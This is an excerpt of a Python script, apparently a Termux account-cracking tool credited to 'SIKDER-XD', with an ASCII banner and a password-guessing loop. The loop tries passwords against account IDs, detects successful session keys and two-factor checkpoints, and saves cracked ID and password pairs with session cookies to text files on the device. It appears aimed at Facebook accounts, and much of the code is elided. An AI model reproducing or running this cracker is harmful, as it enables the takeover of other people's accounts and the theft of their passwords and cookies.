...
LIMITX=f"EXAMPLE : {G}1000{W},{G}5000{W},{G}10000{W},{G}99999{W},{G}999999{W}"
############------[ A SYS ]------#########
...
############------[ LOGO ]------#########
os.system('espeak -a 300 "well,come to, SIKDER, tools"')
def logo():
	os.system('clear');print(f"""\033[38;5;46m
_____ _____ _  _______  ______ _____  
/ ____|_   _| |/ /  __ \|  ____|  __ \ 
| (___   | | | ' /| |  | | |__  | |__) |
\___ \  | | |  < | |  | |  __| |  _  / 
____) |_| |_| . \| |__| | |____| | \ \ 
...
{40*"="} \x1b[1;97m
 [{G}+{W}] AUTHOR   : SIKDER-XD
 [{G}+{W}] GITHUB   : SIKDER-XD       
 [{G}+{W}] FACEBOOK : Sikder Obeaydul
 [{G}+{W}] YOU TUBE : sikder obaidul                       
...
def graphrm(id,psd,tid):
	...
	for psw in psd:
		...
		if 'session_key' in lo:
			...
			print(f'\r\r{G}[SIKDER-OK] {iid} | {psw}{W}');os.system('espeak -a 300 "ok id"');ok.append(id);open('/sdcard/TKM-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
			if 'y' in cokix:print(f'\r\r{R}[{G}COOKIES🍪{R}]{W} : {G}{coki}{E}');print(f"{W}{40*'-'}{E}")
			break
		elif twfx in str(lo):
			iid = lo['error']['error_data']['uid']
			print(f'\r\r{BL}[SIKDER-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "two,f id"');open('/sdcard/TKM-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			twf.append(id)
			break
			...
			if iid in ok:pass
				...
				if 'y' in cpx:
					print(f'\r\r{R}[SIKDER💔-CP] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "cp id"');open('/sdcard/TKM-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
			break
		else:continue
	lop+=1
Main()
